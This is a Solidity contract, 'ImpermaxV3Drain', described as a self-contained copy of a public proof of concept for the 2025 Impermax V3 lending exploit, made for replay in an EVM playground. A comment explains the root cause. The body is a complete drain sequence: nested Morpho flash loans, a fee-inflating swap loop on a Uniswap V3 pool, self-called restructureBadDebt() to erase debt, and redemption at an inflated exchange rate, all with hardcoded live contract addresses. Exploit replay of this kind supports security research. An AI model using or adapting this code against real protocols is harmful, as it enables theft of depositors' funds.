// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2025-04-ImpermaxV3).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); the Morpho flash-loan callback `onMorphoFlashLoan`,
// the UniswapV3 swap/mint callbacks, and the ERC721 receiver hook all live on the
// test contract itself), so there is no standalone exploit contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/ImpermaxV3_exp.sol (ImpermaxV3_exp.testExploit /
// onMorphoFlashLoan / uniswapV3SwapCallback / uniswapV3MintCallback), with the
// original test's setUp() approval folded into a prep() step run via the
// config's `setup.steps` before the recorded attack (Morpho pulls the flash-loan
// repayment via transferFrom, so the allowance must exist before run() executes).
//
// Root cause (see ImpermaxV3_exp.md): ImpermaxV3Collateral.restructureBadDebt()
// is permissionless and forgives an underwater position's debt by decrementing
// ImpermaxV3Borrowable's accounting (principal + totalBorrows) without ever
// reclaiming the forgiven tokens from the borrower. Because exchangeRate() values
// shares as (cash + totalBorrows) / totalSupply, and TokenizedUniswapV3Position
// counts un-reinvested UniswapV3 fees at full weight toward collateral value, an
// attacker who is simultaneously the dominant lender (via mint()) and the
// borrower of a self-crafted, fee-inflated LP position can borrow the entire
// pool, self-call restructureBadDebt() to erase ~70% of that debt as a pure
// accounting write-off, repay only the reduced debt, then redeem lender shares
// at the still-inflated exchange rate — pocketing the gap as real WETH.

interface IFS {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);

    // Morpho
    function flashLoan(address token, uint256 assets, bytes calldata data) external;

    // UniswapV3 pool (0x1C45.../0xd0b5...)
    function mint(address recipient, int24 tickLower, int24 tickUpper, uint128 amount, bytes calldata data)
        external
        returns (uint256 amount0, uint256 amount1);

    // ImpermaxV3Borrowable
    function mint(address minter) external returns (uint256 mintTokens);
    function borrow(uint256 tokenId, address receiver, uint256 borrowAmount, bytes calldata data) external;
    function currentBorrowBalance(uint256 tokenId) external returns (uint256);
    function exchangeRate() external returns (uint256);
    function redeem(address redeemer) external returns (uint256 redeemAmount);
}

interface IUniPairV3 {
    function swap(address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes calldata data)
        external
        returns (int256 amount0, int256 amount1);
}

interface IimpermaxV3Collateral {
    function restructureBadDebt(uint256 tokenId) external;
    function redeem(address to, uint256 tokenId, uint256 percentage) external returns (uint256 redeemTokenId);
    function mint(address to, uint256 tokenId) external;
}

interface INFTLP {
    struct RealXY {
        uint256 realX;
        uint256 realY;
    }

    struct RealXYs {
        RealXY lowestPrice;
        RealXY currentPrice;
        RealXY highestPrice;
    }
}

interface ITokenizedUniswapV3Position {
    function mint(address to, uint24 fee, int24 tickLower, int24 tickUpper) external returns (uint256 newTokenId);
    function reinvest(uint256 tokenId, address bountyTo) external returns (uint256 bounty0, uint256 bounty1);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function getPositionData(uint256 _tokenId, uint256 _safetyMarginSqrt)
        external
        returns (uint256 priceSqrtX96, INFTLP.RealXYs memory realXYs);
    function redeem(address to, uint256 tokenId) external returns (uint256 amount0, uint256 amount1);
}

contract ImpermaxV3Drain {
    address constant ImpermaxV3Borrowable = 0x5d93f216f17c225a8B5fFA34e74B7133436281eE;
    address constant Morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant WETH_address = 0x4200000000000000000000000000000000000006;
    address constant USDC_address = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant ImpermaxV3Collateral = 0xc1D49fa32d150B31C4a5bf1Cbf23Cf7Ac99eaF7d;

    address constant TokenizedUniswapV3Position = 0xa68F6075ae62eBD514d1600cb5035fa0E2210ef8;
    address constant UniV3pool_200 = 0x1C450D7d1FD98A0b04E30deCFc83497b33A4F608;
    address constant UniV3pool_500 = 0xd0b53D9277642d899DF5C87A3966A349A798F224;

    uint256 public borrowUSDC_amount = 22539727986604;
    uint256 public borrowWETH_amount = 10544813644832897955984;

    bool private inFlashLoan;

    // Pre-attack prep: mirrors ImpermaxV3_exp.setUp() — approve Morpho to pull
    // the WETH flash-loan repayment. Called via config `setup.steps` before run().
    function prep() external {
        IFS(WETH_address).approve(Morpho, 10544813644832897955984);
    }

    function run() external {
        IFS(Morpho).flashLoan(WETH_address, borrowWETH_amount, abi.encodePacked(uint256(1)));
    }

    function onMorphoFlashLoan(uint256, bytes memory) external {
        if (!inFlashLoan) {
            // after borrowing WETH, we continue to borrow USDC.
            inFlashLoan = true;
            IFS(USDC_address).approve(Morpho, borrowUSDC_amount);
            IFS(Morpho).flashLoan(USDC_address, borrowUSDC_amount, abi.encodePacked(uint256(1)));
        } else {
            // following this USDC swap, the uniswapV3 will invoke uniswapV3SwapCallback to transfer USDC.
            uint160 falsesqrtPriceLimitX96 = 1461446703485210103287273052203988822378723970341;
            IUniPairV3(UniV3pool_200).swap(
                address(this), false, 1000000000, falsesqrtPriceLimitX96, abi.encodePacked(uint256(1))
            );

            IFS(UniV3pool_200).mint(
                TokenizedUniswapV3Position, -196216, -102028, 3315194000212825, abi.encodePacked(uint256(1))
            );
            uint256 newtoken_id =
                ITokenizedUniswapV3Position(TokenizedUniswapV3Position).mint(address(this), 200, -196216, -102028);
            ITokenizedUniswapV3Position(TokenizedUniswapV3Position).transferFrom(
                address(this), ImpermaxV3Collateral, newtoken_id
            );
            IimpermaxV3Collateral(ImpermaxV3Collateral).mint(address(this), newtoken_id);

            // start to swap to get fee from pool's transaction.
            uint160 truesqrtPriceLimitX96 = 4295128740;
            IUniPairV3(UniV3pool_200).swap(address(this), true, -400000000000, truesqrtPriceLimitX96, abi.encodePacked(uint256(1)));
            IUniPairV3(UniV3pool_200).swap(
                address(this), false, 400080026003, falsesqrtPriceLimitX96, abi.encodePacked(uint256(1))
            );

            ITokenizedUniswapV3Position(TokenizedUniswapV3Position).reinvest(newtoken_id, address(this));

            // go on to swap for 100 times
            int256 trueamountSpecified = -19400000000000;
            int256 falseamountSpecified = 19403880776155;
            for (uint256 i = 0; i < 100; i++) {
                IUniPairV3(UniV3pool_200).swap(
                    address(this), true, trueamountSpecified, truesqrtPriceLimitX96, abi.encodePacked(uint256(1))
                );
                IUniPairV3(UniV3pool_200).swap(
                    address(this), false, falseamountSpecified, falsesqrtPriceLimitX96, abi.encodePacked(uint256(1))
                );
            }

            // one more time swap for 100000.
            IUniPairV3(UniV3pool_200).swap(address(this), false, 100000, falsesqrtPriceLimitX96, abi.encodePacked(uint256(1)));

            uint256 safetyMarginSqrt = 1183215960000000000;
            ITokenizedUniswapV3Position(TokenizedUniswapV3Position).getPositionData(newtoken_id, safetyMarginSqrt);

            uint256 wad = 166988030575033714385;
            IFS(WETH_address).transfer(ImpermaxV3Borrowable, wad);

            IFS(ImpermaxV3Borrowable).mint(address(this));
            uint256 borrowAmount = IFS(WETH_address).balanceOf(ImpermaxV3Borrowable);
            IFS(ImpermaxV3Borrowable).borrow(255, address(this), borrowAmount, "");

            ITokenizedUniswapV3Position(TokenizedUniswapV3Position).reinvest(newtoken_id, address(this));
            IimpermaxV3Collateral(ImpermaxV3Collateral).restructureBadDebt(255);
            uint256 currentBorrowBalance = IFS(ImpermaxV3Borrowable).currentBorrowBalance(newtoken_id);

            IFS(WETH_address).transfer(ImpermaxV3Borrowable, currentBorrowBalance);
            IFS(ImpermaxV3Borrowable).borrow(newtoken_id, address(this), 0, "");
            IimpermaxV3Collateral(ImpermaxV3Collateral).redeem(address(this), newtoken_id, 1000000000000000000);
            ITokenizedUniswapV3Position(TokenizedUniswapV3Position).redeem(address(this), newtoken_id);

            IUniPairV3(UniV3pool_200).swap(address(this), true, 14260200223938238, truesqrtPriceLimitX96, abi.encodePacked(uint256(1)));

            uint256 temp_amount = 120924566533707506470;
            IFS(ImpermaxV3Borrowable).transfer(ImpermaxV3Borrowable, temp_amount);
            IFS(ImpermaxV3Borrowable).redeem(address(this));

            IUniPairV3(UniV3pool_500).swap(address(this), true, -19760825, truesqrtPriceLimitX96, abi.encodePacked(uint256(1)));
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        require(msg.sender == UniV3pool_200 || msg.sender == UniV3pool_500, "Invalid pool caller");

        if (amount0Delta > 0) {
            IFS(WETH_address).transfer(msg.sender, uint256(amount0Delta));
        } else {
            IFS(USDC_address).transfer(msg.sender, uint256(amount1Delta));
        }
    }

    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes calldata) external {
        IFS(WETH_address).transfer(UniV3pool_200, amount0);
        IFS(USDC_address).transfer(UniV3pool_200, amount1);
    }
}
